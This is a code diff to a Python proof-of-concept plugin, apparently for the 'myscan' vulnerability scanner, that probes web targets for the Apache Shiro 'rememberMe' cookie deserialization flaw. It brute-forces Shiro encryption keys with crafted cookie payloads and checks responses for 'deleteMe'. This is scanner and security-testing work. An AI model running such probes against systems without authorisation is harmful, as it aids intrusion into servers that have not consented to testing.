@@ -8,21 +8,20 @@
 '''
 from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
 from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
-from myscan.config import scan_set
 from myscan.lib.core.threads import mythread
 import base64
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
 from myscan.lib.core.base import PocBase
+from myscan.lib.core.const import notAcceptedExt
 
 
 class POC(PocBase):
     def __init__(self, workdata):
         self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
-        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
         self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
-        self.name = "shiro_rce perfolder test"
+        self.name = "shiro_rce perschme test"
         self.vulmsg = "no detail"
         self.level = 3  # 0:Low  1:Medium 2:High
         self.success = False
@@ -126,16 +125,24 @@ class POC(PocBase):
         )
 
     def verify(self):
-        # 根据config.py 配置的深度，限定一下目录深度
-        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
+        addExt = [
+            '.php', '.php3', '.php4', '.php5', '.php7', '.phtml',
+            '.asp', '.aspx', '.ascx', '.asmx',
+            '.chm', '.cfc', '.cfmx', '.cfml',
+            '.py',
+            '.rb',
+            '.pl',
+            '.cgi',
+            '.htm', '.html',
+        ]
+        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt + addExt:
             return
         self.parse = dictdata_parser(self.dictdata)
         self.maxkey = self.parse.getrootpath() + self.name
         if not self.can_output(self.maxkey):
             return
         req = {
-            "method": "GET",
-            "url": self.url,
+
             "headers": {
                 "Cookie": "rememberMe=1",
             },
@@ -143,7 +150,9 @@ class POC(PocBase):
             "allow_redirects": False,
             "verify": False,
         }
-        r = request(**req)
+
+        req_ = self.parse.generaterequest(req)
+        r = request(**req_)
         if r != None and "deleteMe" in r.headers.get("Set-Cookie", ""):
             mythread(self.runit, self.shirokyes)
             if not self.success:
@@ -154,8 +163,6 @@ class POC(PocBase):
             return
         payload = self.generator_payload(key)
         req = {
-            "method": "GET",
-            "url": self.url,
             "headers": {
                 "Cookie": "rememberMe={}".format(payload),
             },
@@ -163,18 +170,19 @@ class POC(PocBase):
             "allow_redirects": False,
             "verify": False,
         }
-        r = request(**req)
+        req_ = self.parse.generaterequest(req)
+        r=request(**req_)
         if r is not None and "deleteMe" not in r.headers.get('Set-Cookie', ''):
             self.can_output(self.maxkey, True)
             self.save(r, key)
 
     def save(self, r, key, level=None):
-        if not self.success and self.can_output(self.maxkey):
+        if not self.success:
             self.success = True
             parser_ = response_parser(r)
             self.result.append({
                 "name": self.name,
-                "url": self.url,
+                "url": self.parse.getrootpath(),
                 "level": level if level == 0 else self.level,  # 0:Low  1:Medium 2:High
                 "detail": {
                     "vulmsg": self.vulmsg,
